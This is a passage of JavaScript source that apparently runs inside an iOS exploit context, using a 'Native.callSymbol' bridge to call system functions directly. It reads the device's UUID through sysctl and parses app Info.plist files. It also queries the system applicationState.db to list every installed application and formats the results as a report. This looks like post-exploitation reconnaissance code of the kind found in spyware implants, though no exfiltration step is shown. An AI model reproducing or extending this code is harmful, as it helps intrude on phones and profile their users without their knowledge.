\"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\tconst resultBuf = Native.callSymbol(\"malloc\", 256);\n\t\t\tif (!resultBuf || resultBuf === 0n) {\n\t\t\t\tNative.callSymbol(\"free\", mibBuf);\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\tconst lengthBuf = Native.callSymbol(\"malloc\", 8);\n\t\t\tif (!lengthBuf || lengthBuf === 0n) {\n\t\t\t\tNative.callSymbol(\"free\", mibBuf);\n\t\t\t\tNative.callSymbol(\"free\", resultBuf);\n\t\t\t\treturn \"unknown-device\";\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\tNative.write(mibBuf, mib);\n\t\t\t\t\n\t\t\t\tconst lengthView = new DataView(new ArrayBuffer(8));\n\t\t\t\tlengthView.setUint32(0, 256, true);\n\t\t\t\tlengthView.setUint32(4, 0, true);\n\t\t\t\tNative.write(lengthBuf, lengthView.buffer);\n\t\t\t\t\n\t\t\t\tlet ret = Native.callSymbol(\"sysctl\", mibBuf, 2, 0n, lengthBuf, 0n, 0);\n\t\t\t\tif (ret !== 0) {\n\t\t\t\t\treturn \"unknown-device\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst lengthData = Native.read(lengthBuf, 8);\n\t\t\t\tif (!lengthData) {\n\t\t\t\t\treturn \"unknown-device\";\n\t\t\t\t}\n\t\t\t\tconst lengthView2 = new DataView(lengthData);\n\t\t\t\tconst length = lengthView2.getUint32(0, true);\n\t\t\t\t\n\t\t\t\tif (length <= 0 || length > 256) {\n\t\t\t\t\treturn \"unknown-device\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tlengthView.setUint32(0, length, true);\n\t\t\t\tNative.write(lengthBuf, lengthView.buffer);\n\t\t\t\t\n\t\t\t\tret = Native.callSymbol(\"sysctl\", mibBuf, 2, resultBuf, lengthBuf, 0n, 0);\n\t\t\t\tif (ret !== 0) {\n\t\t\t\t\treturn \"unknown-device\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst rawData = Native.read(resultBuf, length);\n\t\t\t\tif (!rawData) {\n\t\t\t\t\treturn \"unknown-device\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst bytes = new Uint8Array(rawData);\n\t\t\t\tlet uuid = \"\";\n\t\t\t\t\n\t\t\t\tfor (let i = 0; i < bytes.length && i < length; i++) {\n\t\t\t\t\tconst byte = bytes[i];\n\t\t\t\t\tif (byte === 0) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif ((byte >= 32 && byte <= 126) || byte === 45 || byte === 58) {\n\t\t\t\t\t\tuuid += String.fromCharCode(byte);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tuuid = uuid.trim();\n\t\t\t\t\n\t\t\t\tif (uuid && uuid.length > 0) {\n\t\t\t\t\treturn uuid;\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", mibBuf);\n\t\t\t\tNative.callSymbol(\"free\", resultBuf);\n\t\t\t\tNative.callSymbol(\"free\", lengthBuf);\n\t\t\t}\n\t\t} catch (sysctlError) {\n\t\t}\n\t\t\n\t\treturn \"unknown-device\";\n\t} catch (e) {\n\t\treturn \"unknown-device\";\n\t}\n}\n\n/**\n * Get file size using stat\n */\nfunction getFileSize(filePath) {\n\ttry {\n\t\tconst statBuf = Native.callSymbol(\"malloc\", BigInt(144));\n\t\tif (!statBuf || statBuf === 0n) {\n\t\t\treturn -1;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tconst statResult = Native.callSymbol(\"stat\", filePath, statBuf);\n\t\t\tif (statResult !== 0) {\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\t\n\t\t\t// st_size is at offset 0x60 (96) in struct stat on ARM64\n\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\tconst statView = new DataView(statData);\n\t\t\tconst fileSize = Number(statView.getBigUint64(0x60, true));\n\t\t\t\n\t\t\treturn fileSize;\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t}\n\t} catch (e) {\n\t\treturn -1;\n\t}\n}\n\n/**\n * Check if file exists and is accessible\n */\nfunction fileExists(filePath) {\n\tconst accessResult = Native.callSymbol(\"access\", filePath, 0); // F_OK = 0\n\treturn Number(accessResult) === 0;\n}\n\n/**\n * Read directory entry name from dirent structure\n */\nfunction readDirentName(entry) {\n\t// iOS dirent structure:\n\t// d_ino: 8 bytes (offset 0)\n\t// d_seekoff: 8 bytes (offset 8)\n\t// d_reclen: 2 bytes (offset 16)\n\t// d_namlen: 2 bytes (offset 18)\n\t// d_type: 1 byte (offset 20)\n\t// d_name: variable, starts at offset 21\n\tconst direntData = Native.read(entry, 280);\n\tif (!direntData || direntData.length < 21) {\n\t\treturn \"\";\n\t}\n\t\n\tconst direntView = new DataView(direntData);\n\tconst d_namlen = direntView.getUint16(18, true);\n\t\n\tif (d_namlen > 0 && d_namlen < 256) {\n\t\tconst namePtr = entry + 21n;\n\t\tconst name = Native.readString(namePtr, d_namlen).replace(/\\0/g, '').trim();\n\t\tif (name.length > 0 && name.charCodeAt(0) >= 0x20 && name.charCodeAt(0) <= 0x7E) {\n\t\t\treturn name;\n\t\t}\n\t}\n\t\n\t// Fallback: try reading from offset 21\n\tconst namePtr21 = entry + 21n;\n\tlet name = Native.readString(namePtr21, 256).replace(/\\0/g, '').trim();\n\t\n\t// Strip leading control characters\n\twhile (name.length > 0 && name.charCodeAt(0) >= 1 && name.charCodeAt(0) <= 31) {\n\t\tname = name.substring(1);\n\t}\n\t\n\treturn name.trim();\n}\n\n/**\n * Extract value from XML plist text\n */\nfunction extractPlistValue(plistText, key) {\n\ttry {\n\t\tconst keyPattern = \"<key>\" + key + \"</key>\";\n\t\tconst keyIndex = plistText.indexOf(keyPattern);\n\t\tif (keyIndex === -1) return null;\n\t\t\n\t\tconst afterKey = plistText.substring(keyIndex + keyPattern.length);\n\t\tconst stringStart = afterKey.indexOf(\"<string>\");\n\t\tif (stringStart === -1 || stringStart > 100) return null;\n\t\t\n\t\tconst valueStart = stringStart + 8;\n\t\tconst valueEnd = afterKey.indexOf(\"</string>\", valueStart);\n\t\tif (valueEnd === -1) return null;\n\t\t\n\t\treturn afterKey.substring(valueStart, valueEnd).trim();\n\t} catch (e) {\n\t\treturn null;\n\t}\n}\n\n/**\n * Search for bundle ID pattern in binary plist bytes (fallback method)\n * Binary plists can store strings as ASCII, UTF-8, or UTF-16\n */\nfunction extractBundleIdFromBytes(plistBytes) {\n\ttry {\n\t\t// Method 1: Convert bytes to ASCII string (skip non-printable)\n\t\tlet asciiStr = \"\";\n\t\tfor (let i = 0; i < plistBytes.length; i++) {\n\t\t\tconst c = plistBytes[i];\n\t\t\tif (c >= 32 && c <= 126) {\n\t\t\t\tasciiStr += String.fromCharCode(c);\n\t\t\t} else if (c === 0 && asciiStr.length > 0 && asciiStr[asciiStr.length-1] !== ' ') {\n\t\t\t\tasciiStr += \" \"; // null terminator = word boundary\n\t\t\t}\n\t\t}\n\t\t\n\t\t// Method 2: Also try UTF-16 (every other byte for ASCII range)\n\t\tlet utf16Str = \"\";\n\t\tfor (let i = 0; i < plistBytes.length - 1; i += 2) {\n\t\t\tconst c = plistBytes[i];\n\t\t\tconst c2 = plistBytes[i + 1];\n\t\t\tif (c >= 32 && c <= 126 && c2 === 0) {\n\t\t\t\tutf16Str += String.fromCharCode(c);\n\t\t\t} else if (c === 0 && c2 === 0) {\n\t\t\t\tutf16Str += \" \";\n\t\t\t}\n\t\t}\n\t\t\n\t\t// Combine both for searching\n\t\tconst searchStr = asciiStr + \" \" + utf16Str;\n\t\t\n\t\t// Look for bundle ID patterns\n\t\t// For group containers, look for \"group.\" prefix first\n\t\tconst groupPattern = /(group\\.[a-zA-Z0-9_.-]+)/g;\n\t\tlet match;\n\t\twhile ((match = groupPattern.exec(searchStr)) !== null) {\n\t\t\tconst candidate = match[1];\n\t\t\tif (candidate.length > 100) continue;\n\t\t\t// Found a group container ID!\n\t\t\treturn candidate;\n\t\t}\n\t\t\n\t\t// Fall back to regular bundle ID pattern\n\t\tconst bundleIdPattern = /([a-zA-Z][a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+(?:\\.[a-zA-Z0-9_-]+)*)/g;\n\t\twhile ((match = bundleIdPattern.exec(searchStr)) !== null) {\n\t\t\tconst candidate = match[1];\n\t\t\t// Skip common non-bundle patterns\n\t\t\tif (candidate.includes(\"http://\") || candidate.includes(\"https://\")) continue;\n\t\t\tif (candidate.endsWith(\".plist\") || candidate.endsWith(\".db\")) continue;\n\t\t\tif (candidate.length > 100) continue;\n\t\t\t\n\t\t\treturn candidate;\n\t\t}\n\t\t\n\t} catch (e) {\n\t\t// Ignore\n\t}\n\treturn null;\n}\n\n/**\n * Extract values from binary plist using CoreFoundation\n * Falls back to byte pattern matching if CF parsing fails\n */\nfunction extractFromBinaryPlist(plistBytes) {\n\tconst result = {};\n\t\n\t// First try byte pattern matching (simpler and more reliable)\n\tconst bundleIdFromBytes = extractBundleIdFromBytes(plistBytes);\n\tif (bundleIdFromBytes) {\n\t\tresult.MCMMetadataIdentifier = bundleIdFromBytes;\n\t\tresult.CFBundleIdentifier = bundleIdFromBytes;\n\t}\n\t\n\ttry {\n\t\t// Create CFData from plist bytes\n\t\tconst dataPtr = Native.callSymbol(\"malloc\", plistBytes.length);\n\t\tif (!dataPtr || dataPtr === 0n) return result;\n\t\t\n\t\ttry {\n\t\t\t// Write plist bytes to memory\n\t\t\tconst dataView = new Uint8Array(plistBytes.length);\n\t\t\tfor (let i = 0; i < plistBytes.length; i++) {\n\t\t\t\tdataView[i] = plistBytes[i];\n\t\t\t}\n\t\t\tNative.write(dataPtr, dataView);\n\t\t\t\n\t\t\t// Create CFDataRef\n\t\t\tconst kCFAllocatorDefault = 0n;\n\t\t\tconst cfData = Native.callSymbol(\"CFDataCreate\", kCFAllocatorDefault, dataPtr, BigInt(plistBytes.length));\n\t\t\t\n\t\t\tif (!cfData || cfData === 0n) return result;\n\t\t\t\n\t\t\ttry {\n\t\t\t\t// Parse plist using CFPropertyListCreateWithData\n\t\t\t\tconst kCFPropertyListImmutable = 0;\n\t\t\t\tconst formatPtr = Native.callSymbol(\"malloc\", 4);\n\t\t\t\tconst errorPtr = Native.callSymbol(\"malloc\", 8);\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\tNative.write32(formatPtr, 0);\n\t\t\t\t\tNative.write64(errorPtr, 0n);\n\t\t\t\t\t\n\t\t\t\t\tconst plist = Native.callSymbol(\"CFPropertyListCreateWithData\", kCFAllocatorDefault, cfData, kCFPropertyListImmutable, formatPtr, errorPtr);\n\t\t\t\t\t\n\t\t\t\t\tif (!plist || plist === 0n) return result;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\t// Helper to extract string value from CFDictionary\n\t\t\t\t\t\tconst getValue = (keyStr) => {\n\t\t\t\t\t\t\tconst keyBuf = Native.callSymbol(\"malloc\", keyStr.length + 1);\n\t\t\t\t\t\t\tif (!keyBuf || keyBuf === 0n) return null;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tNative.writeString(keyBuf, keyStr);\n\t\t\t\t\t\t\t\tconst cfKey = Native.callSymbol(\"CFStringCreateWithCString\", kCFAllocatorDefault, keyBuf, 0x08000100);\n\t\t\t\t\t\t\t\tif (!cfKey || cfKey === 0n) return null;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\tconst value = Native.callSymbol(\"CFDictionaryGetValue\", plist, cfKey);\n\t\t\t\t\t\t\t\t\tif (!value || value === 0n) return null;\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tconst length = Native.callSymbol(\"CFStringGetLength\", value);\n\t\t\t\t\t\t\t\t\tif (Number(length) <= 0 || Number(length) > 1000) return null;\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tconst maxLen = Number(length) + 1;\n\t\t\t\t\t\t\t\t\tconst strBuf = Native.callSymbol(\"malloc\", maxLen);\n\t\t\t\t\t\t\t\t\tif (!strBuf || strBuf === 0n) return null;\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\tconst success = Native.callSymbol(\"CFStringGetCString\", value, strBuf, maxLen, 0x08000100);\n\t\t\t\t\t\t\t\t\t\tif (success) {\n\t\t\t\t\t\t\t\t\t\t\treturn Native.readString(strBuf, maxLen).replace(/\\0/g, '');\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\treturn null;\n\t\t\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", strBuf);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", cfKey);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", keyBuf);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t};\n\t\t\t\t\t\t\n\t\t\t\t\t\t// CF parsing succeeded, use these values (they're more accurate)\n\t\t\t\t\t\tconst cfBundleId = getValue(\"CFBundleIdentifier\");\n\t\t\t\t\t\tconst mcmId = getValue(\"MCMMetadataIdentifier\");\n\t\t\t\t\t\tconst cfName = getValue(\"CFBundleName\");\n\t\t\t\t\t\tconst cfDisplayName = getValue(\"CFBundleDisplayName\");\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (cfBundleId) result.CFBundleIdentifier = cfBundleId;\n\t\t\t\t\t\tif (mcmId) result.MCMMetadataIdentifier = mcmId;\n\t\t\t\t\t\tif (cfName) result.CFBundleName = cfName;\n\t\t\t\t\t\tif (cfDisplayName) result.CFBundleDisplayName = cfDisplayName;\n\t\t\t\t\t\tresult.CFBundleShortVersionString = getValue(\"CFBundleShortVersionString\");\n\t\t\t\t\t\tresult.CFBundleVersion = getValue(\"CFBundleVersion\");\n\t\t\t\t\t\t\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", plist);\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"free\", formatPtr);\n\t\t\t\t\tNative.callSymbol(\"free\", errorPtr);\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"CFRelease\", cfData);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", dataPtr);\n\t\t}\n\t} catch (e) {\n\t\t// Ignore errors - we have fallback from byte pattern matching\n\t}\n\t\n\treturn result;\n}\n\n// Debug counter for plist logging\nlet plistDebugCount = 0;\n\n/**\n * Read Info.plist and extract bundle information (simplified version)\n */\nfunction readInfoPlist(plistPath) {\n\ttry {\n\t\tconst fd = Native.callSymbol(\"open\", plistPath, 0);\n\t\tif (Number(fd) < 0) {\n\t\t\tif (plistDebugCount < 3) {\n\t\t\t}\n\t\t\treturn null;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\t// Get file size\n\t\t\tconst SEEK_END = 2;\n\t\t\tconst SEEK_SET = 0;\n\t\t\tconst fileSize = Native.callSymbol(\"lseek\", fd, 0n, SEEK_END);\n\t\t\tif (Number(fileSize) < 0 || Number(fileSize) > 1024 * 1024) {\n\t\t\t\treturn null;\n\t\t\t}\n\t\t\t\n\t\t\tNative.callSymbol(\"lseek\", fd, 0n, SEEK_SET);\n\t\t\t\n\t\t\tconst size = Number(fileSize);\n\t\t\tconst buffer = Native.callSymbol(\"malloc\", BigInt(size));\n\t\t\tif (!buffer || buffer === 0n) return null;\n\t\t\t\n\t\t\ttry {\n\t\t\t\tconst bytesRead = Native.callSymbol(\"read\", fd, buffer, BigInt(size));\n\t\t\t\tif (Number(bytesRead) !== size) return null;\n\t\t\t\t\n\t\t\t\tconst plistData = Native.read(buffer, size);\n\t\t\t\tconst plistBytes = new Uint8Array(plistData);\n\t\t\t\t\n\t\t\t\t// Debug log for first few plists\n\t\t\t\tif (plistDebugCount < 3) {\n\t\t\t\t\tplistDebugCount++;\n\t\t\t\t\tconst isBinary = plistBytes.length >= 6 && \n\t\t\t\t\t    plistBytes[0] === 0x62 && plistBytes[1] === 0x70;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Check if binary plist (starts with \"bpli\")\n\t\t\t\tif (plistBytes.length >= 6 && \n\t\t\t\t    plistBytes[0] === 0x62 && plistBytes[1] === 0x70 && \n\t\t\t\t    plistBytes[2] === 0x6C && plistBytes[3] === 0x69) {\n\t\t\t\t\t// Binary plist - use CoreFoundation to parse\n\t\t\t\t\tconst result = extractFromBinaryPlist(plistBytes);\n\t\t\t\t\tif (plistDebugCount <= 3) {\n\t\t\t\t\t}\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// XML plist - convert bytes to string manually (TextDecoder may not exist)\n\t\t\t\tlet plistText = \"\";\n\t\t\t\tfor (let i = 0; i < plistBytes.length; i++) {\n\t\t\t\t\tplistText += String.fromCharCode(plistBytes[i]);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\treturn {\n\t\t\t\t\tCFBundleIdentifier: extractPlistValue(plistText, \"CFBundleIdentifier\"),\n\t\t\t\t\tCFBundleName: extractPlistValue(plistText, \"CFBundleName\"),\n\t\t\t\t\tCFBundleDisplayName: extractPlistValue(plistText, \"CFBundleDisplayName\"),\n\t\t\t\t\tCFBundleShortVersionString: extractPlistValue(plistText, \"CFBundleShortVersionString\"),\n\t\t\t\t\tCFBundleVersion: extractPlistValue(plistText, \"CFBundleVersion\"),\n\t\t\t\t\tMCMMetadataIdentifier: extractPlistValue(plistText, \"MCMMetadataIdentifier\")\n\t\t\t\t};\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", buffer);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"close\", fd);\n\t\t}\n\t} catch (e) {\n\t\treturn null;\n\t}\n}\n\n/**\n * Parse applicationState.db SQLite database to get list of installed apps\n * This is the most reliable source for bundle IDs on iOS\n */\nfunction getInstalledAppsList() {\n\tlet result = \"=== INSTALLED APPLICATIONS ===\\n\";\n\tresult += \"Generated: \" + new Date().toISOString() + \"\\n\\n\";\n\t\n\tconst bundleIds = [];\n\tconst dbPath = \"/private/var/mobile/Library/FrontBoard/applicationState.db\";\n\t\n\ttry {\n\t\tconst dbPathBuf = Native.callSymbol(\"malloc\", dbPath.length + 1);\n\t\tif (!dbPathBuf || dbPathBuf === 0n) {\n\t\t\treturn result + \"ERROR: Failed to allocate memory\\n\";\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tNative.writeString(dbPathBuf, dbPath);\n\t\t\t\n\t\t\t// SQLite constants\n\t\t\tconst SQLITE_OK = 0;\n\t\t\tconst SQLITE_ROW = 100;\n\t\t\tconst SQLITE_DONE = 101;\n\t\t\tconst SQLITE_OPEN_READONLY = 1;\n\t\t\t\n\t\t\tconst dbHandlePtr = Native.callSymbol(\"malloc\", 8n);\n\t\t\tif (!dbHandlePtr || dbHandlePtr === 0n) {\n\t\t\t\tNative.callSymbol(\"free\", dbPathBuf);\n\t\t\t\treturn result + \"ERROR: Failed to allocate db handle\\n\";\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\tNative.write64(dbHandlePtr, 0n);\n\t\t\t\t\n\t\t\t\tconst openResult = Native.callSymbol(\"sqlite3_open_v2\", dbPathBuf, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);\n\t\t\t\t\n\t\t\t\tif (Number(openResult) !== SQLITE_OK) {\n\t\t\t\t\treturn result + \"ERROR: Failed to open database (code \" + openResult + \")\\n\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst dbHandle = Native.readPtr(dbHandlePtr);\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\t// Query to get all application identifiers\n\t\t\t\t\tconst sql = \"SELECT DISTINCT application_identifier FROM application_identifier_tab ORDER BY application_identifier\";\n\t\t\t\t\tconst sqlBuf = Native.callSymbol(\"malloc\", sql.length + 1);\n\t\t\t\t\tif (!sqlBuf || sqlBuf === 0n) {\n\t\t\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t\t\t\treturn result + \"ERROR: Failed to allocate SQL buffer\\n\";\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tNative.writeString(sqlBuf, sql);\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst stmtPtr = Native.callSymbol(\"malloc\", 8n);\n\t\t\t\t\t\tif (!stmtPtr || stmtPtr === 0n) {\n\t\t\t\t\t\t\tNative.callSymbol(\"free\", sqlBuf);\n\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t\t\t\t\treturn result + \"ERROR: Failed to allocate statement pointer\\n\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tNative.write64(stmtPtr, 0n);\n\t\t\t\t\t\t\tconst tailPtr = Native.callSymbol(\"malloc\", 8n);\n\t\t\t\t\t\t\tif (!tailPtr || tailPtr === 0n) {\n\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", stmtPtr);\n\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", sqlBuf);\n\t\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t\t\t\t\t\treturn result + \"ERROR: Failed to allocate tail pointer\\n\";\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tNative.write64(tailPtr, 0n);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst prepResult = Native.callSymbol(\"sqlite3_prepare_v2\", dbHandle, sqlBuf, -1, stmtPtr, tailPtr);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (Number(prepResult) !== SQLITE_OK) {\n\t\t\t\t\t\t\t\t\treturn result + \"ERROR: Failed to prepare query (code \" + prepResult + \")\\n\";\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst stmt = Native.readPtr(stmtPtr);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Execute query and collect results\n\t\t\t\t\t\t\t\twhile (true) {\n\t\t\t\t\t\t\t\t\tconst stepResult = Native.callSymbol(\"sqlite3_step\", stmt);\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tif (Number(stepResult) === SQLITE_ROW) {\n\t\t\t\t\t\t\t\t\t\t// Get application_identifier (column 0)\n\t\t\t\t\t\t\t\t\t\tconst textPtr = Native.callSymbol(\"sqlite3_column_text\", stmt, 0);\n\t\t\t\t\t\t\t\t\t\tif (textPtr && textPtr !== 0n) {\n\t\t\t\t\t\t\t\t\t\t\tconst bundleId = Native.readString(textPtr, 256);\n\t\t\t\t\t\t\t\t\t\t\tif (bundleId && bundleId.length > 0) {\n\t\t\t\t\t\t\t\t\t\t\t\tbundleIds.push(bundleId);\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t} else if (Number(stepResult) === SQLITE_DONE) {\n\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_finalize\", stmt);\n\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", tailPtr);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\tNative.callSymbol(\"free\", stmtPtr);\n\t\t\t\t\t\t}\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"free\", sqlBuf);\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", dbHandlePtr);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", dbPathBuf);\n\t\t}\n\t} catch (e) {\n\t\treturn result + \"ERROR: Exception - \" + e.toString() + \"\\n\";\n\t}\n\t\n\t// Format output\n\tresult += \"--- All Installed Applications ---\\n\\n\";\n\t\n\tlet userApps = 0;\n\tlet systemApps = 0;\n\t\n\tfor (const bundleId of bundleIds) {\n\t\tresult += \"[APP] \" + bundleId + \"\\n\";\n\t\tresult += \"  Bundle ID: \" + bundleId + \"\\n\";\n\t\t\n\t\t// Classify as system or user app\n\t\tif (bundleId.startsWith(\"com.apple.\")) {\n\t\t\tsystemApps++;\n\t\t\tresult += \"  Type: System\\n\";\n\t\t} else {\n\t\t\tuserApps++;\n\t\t\tresult += \"  Type: User\\n\";\n\t\t}\n\t\tresult += \"\\n\";\n\t}\n\t\n\tresult += \"=== SUMMARY ===\\n\";\n\tresult += \"Total applications: \" + bundleIds.length + \"\\n\";\n\tresult += \"User applications: \" + userApps + \"\\n\";\n\tresult += \"System applications: \" + systemApps + \"\\n\";\n\t\n\treturn result;\n}\n\n/**\n * Get all bundle IDs from applicationState.db as a lookup object\n * Returns an object where keys are bundle IDs (for fast lookup)\n */\nfunction getBundleIdLookup() {\n\tconst bundleIdMap = {};\n\tconst dbPath = \"/private/var/mobile/Library/FrontBoard/applicationState.db\";\n\t\n\ttry {\n\t\tconst dbPathBuf = Native.callSymbol(\"malloc\", dbPath.length + 1);\n\t\tif (!dbPathBuf || dbPathBuf === 0n) return bundleIdMap;\n\t\t\n\t\ttry {\n\t\t\tNative.writeString(dbPathBuf, dbPath);\n\t\t\t\n\t\t\tconst SQLITE_OK = 0;\n\t\t\tconst SQLITE_ROW = 100;\n\t\t\tconst SQLITE_DONE = 101;\n\t\t\tconst SQLITE_OPEN_READONLY = 1;\n\t\t\t\n\t\t\tconst dbHandlePtr = Native.callSymbol(\"malloc\", 8n);\n\t\t\tif (!dbHandlePtr || dbHandlePtr === 0n) return bundleIdMap;\n\t\t\t\n\t\t\ttry {\n\t\t\t\tNative.write64(dbHandlePtr, 0n);\n\t\t\t\t\n\t\t\t\tconst openResult = Native.callSymbol(\"sqlite3_open_v2\", dbPathBuf, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);\n\t\t\t\tif (Number(openResult) !== SQLITE_OK) return bundleIdMap;\n\t\t\t\t\n\t\t\t\tconst dbHandle = Native.readPtr(dbHandlePtr);\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\tconst sql = \"SELECT DISTINCT application_identifier FROM application_identifier_tab\";\n\t\t\t\t\tconst sqlBuf = Native.callSymbol(\"malloc\", sql.length + 1);\n\t\t\t\t\tif (!sqlBuf || sqlBuf === 0n) return bundleIdMap;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tNative.writeString(sqlBuf, sql);\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst stmtPtr = Native.callSymbol(\"malloc\", 8n);\n\t\t\t\t\t\tif (!stmtPtr || stmtPtr === 0n) return bundleIdMap;\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tNative.write64(stmtPtr, 0n);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tconst prepResult = Native.callSymbol(\"sqlite3_prepare_v2\", dbHandle, sqlBuf, -1, stmtPtr, 0n);\n\t\t\t\t\t\t\tif (Number(prepResult) !== SQLITE_OK) return bundleIdMap;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tconst stmt = Native.readPtr(stmtPtr);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\twhile (true) {\n\t\t\t\t\t\t\t\tconst stepResult = Native.callSymbol(\"sqlite3_step\", stmt);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (Number(stepResult) === SQLITE_ROW) {\n\t\t\t\t\t\t\t\t\tconst textPtr = Native.callSymbol(\"sqlite3_column_text\", stmt, 0);\n\t\t\t\t\t\t\t\t\tif (textPtr && textPtr !== 0n) {\n\t\t\t\t\t\t\t\t\t\tconst bundleId = Native.readString(textPtr, 256);\n\t\t\t\t\t\t\t\t\t\tif (bundleId && bundleId.length > 0) {\n\t\t\t\t\t\t\t\t\t\t\tbundleIdMap[bundleId] = true;\n\t\t\t\t\t\t\t\t\t\t\t// Also add lowercase version for matching\n\t\t\t\t\t\t\t\t\t\t\tbundleIdMap[bundleId.toLowerCase()] = bundleId;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else if (Number(stepResult) === SQLITE_DONE) {\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_finalize\", stmt);\n\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\tNative.callSymbol(\"free\", 